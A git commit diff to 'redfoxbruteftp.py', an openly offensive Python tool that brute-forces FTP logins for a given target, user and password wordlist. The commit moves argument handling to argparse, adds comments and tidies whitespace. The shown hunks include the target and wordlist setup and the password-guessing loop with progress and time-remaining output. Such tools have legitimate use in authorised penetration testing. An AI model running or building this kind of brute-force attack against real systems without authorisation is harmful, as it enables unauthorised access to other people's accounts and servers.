c33ce117441ca4c345fda9dd4566eea0383ed633
foxz1n <148496806+foxzinnx@users.noreply.github.com>
2024-11-04 11:37:04 -0300

    Add files via upload

--- redfoxbruteftp.py
+++ redfoxbruteftp.py
@@ -1,9 +1,10 @@
 from colorama import Fore, Style
 import socket
-import sys
 import re
 from datetime import datetime, timedelta
+import argparse
 
+# Banner
 banner = """
  
    _,-='"-.__               /\\_/\\
@@ -17,14 +18,18 @@ banner = """
 print(Style.BRIGHT + Fore.RED + banner)
 print(Fore.WHITE)
 
-if len(sys.argv) != 4:
-    print("How to use: python redfoxbruteftp.py <target> <user> <wordlist.txt>")
-    sys.exit(1)
+# Argument parser setup
+parser = argparse.ArgumentParser(description=f"{Fore.RED}RED FOX - FTP Brute Force{Style.RESET_ALL}")
+parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
+parser.add_argument("-u", "--user", required=True, help="Username to brute force")
+parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
 
-target = sys.argv[1]
-user = sys.argv[2]
-wordlist_path = sys.argv[3]
+args = parser.parse_args()
+target = args.target
+user = args.user
+wordlist_path = args.wordlist
 
+# Wordlist file handling
 try:
     with open(wordlist_path, 'r') as wordlist:
         passwords = wordlist.readlines()
@@ -35,9 +40,9 @@ except FileNotFoundError:
 print(f"{Style.BRIGHT}{Fore.CYAN}[+] Starting Brute Force on FTP with user {Fore.LIGHTMAGENTA_EX}{user}{Style.RESET_ALL}")
 
 start_time = datetime.now()
-
 last_printed_progress = ""
 
+# Brute force attempt loop
 for idx, password in enumerate(passwords, start=1):
     password = password.strip()
     try:
@@ -60,7 +65,6 @@ for idx, password in enumerate(passwords, start=1):
             remaining_time = timedelta(seconds=0)
 
         elapsed_time_formatted = str(elapsed_time).split(".")[0]
-
         remaining_time_formatted = str(remaining_time).split(".")[0]
 
         progress_message = (
@@ -81,4 +85,3 @@ for idx, password in enumerate(passwords, start=1):
 
 else:
     print(f"\n{Style.BRIGHT}{Fore.RED}[-] Password not found. Try with another wordlist.{Style.RESET_ALL}")
-
